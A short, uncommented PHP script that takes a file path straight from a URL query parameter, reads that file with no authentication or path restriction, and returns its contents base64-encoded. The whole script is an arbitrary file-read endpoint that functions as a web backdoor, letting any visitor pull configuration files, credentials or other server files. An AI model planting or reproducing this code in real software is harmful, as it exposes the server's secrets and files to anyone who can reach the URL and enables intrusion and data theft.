<?php
header('Content-Type: text/plain');
$path = $_GET['path'] ?? '';
if (!$path) {
    die("No path specified");
}
if (!file_exists($path)) {
    die("File not found: " . $path);
}
$content = file_get_contents($path);
echo base64_encode($content);
?>
